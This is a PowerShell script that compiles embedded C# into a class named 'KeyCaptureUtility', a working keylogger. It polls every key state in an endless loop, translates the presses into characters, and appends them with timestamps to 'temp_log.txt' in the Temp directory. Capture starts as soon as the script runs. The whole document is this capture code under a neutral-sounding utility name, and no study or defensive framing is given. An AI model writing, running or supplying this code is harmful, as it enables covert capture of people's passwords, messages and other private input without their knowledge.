# Check if the custom utility type is already loaded
$customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
    $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
}

if (-not $customUtilityType) {
    # Add Type for custom utility class
    Add-Type @"
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;

    public class KeyCaptureUtility
    {
        // DLL Imports for keyboard input functions
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern short GetAsyncKeyState(int virtualKeyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int GetKeyboardState(byte[] keystate);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MapVirtualKey(uint uCode, int uMapType);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

        public static void CaptureInput(string filePath)
        {
            StringBuilder captureBuffer = new StringBuilder();
            var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
            TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);

            // Ensure the file exists, create it if it doesn't
            if (!File.Exists(filePath))
            {
                File.Create(filePath).Dispose();
                Console.WriteLine("File created: " + filePath);  // Log file creation
            }

            // Continuous loop to capture keypresses
            while (true)
            {
                bool keyPressed = false;

                // Check if the last key press time exceeds threshold
                while (lastKeypressTime.Elapsed < keypressThreshold)
                {
                    Thread.Sleep(30);  // Sleep for 30 ms

                    // Iterate through all possible virtual keycodes
                    for (int asc = 8; asc <= 254; asc++)
                    {
                        short keyst = GetAsyncKeyState(asc);

                        // Check if the key is pressed (key state = -32767 means pressed)
                        if (keyst == -32767)
                        {
                            keyPressed = true;
                            lastKeypressTime.Restart();  // Reset inactivity timer

                            // Translate the key to a readable character
                            int vtkey = MapVirtualKey((uint)asc, 3);
                            byte[] kbst = new byte[256];
                            GetKeyboardState(kbst);
                            StringBuilder logChar = new StringBuilder();

                            // Get the character for the key
                            if (ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0) != 0)
                            {
                                string charPressed = logChar.ToString();

                                // Handle special keys like Backspace, Enter, and Escape
                                if (asc == 8) charPressed = "[BKSP]";
                                if (asc == 13) charPressed = "[ENTER]";
                                if (asc == 27) charPressed = "[ESC]";

                                captureBuffer.Append(charPressed);
                            }
                        }
                    }
                }

                if (keyPressed)
                {
                    // Save input to the file with a timestamp
                    string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                    string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
                    File.AppendAllText(filePath, message);
                    Console.WriteLine("Input saved: " + message);  // Log the saved message
                    captureBuffer.Clear();  // Clear the input buffer after saving
                }

                // Reset the stopwatch and continue checking
                lastKeypressTime.Restart();
            }
        }
    }
    "@
}

# Set the path for the captured input log file (using the Temp directory)
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "temp_log.txt")
Write-Host "File path: $tempFilePath"  # Check file path

# Call the CaptureInput method to start capturing inputs (synchronously)
[KeyCaptureUtility]::CaptureInput($tempFilePath)
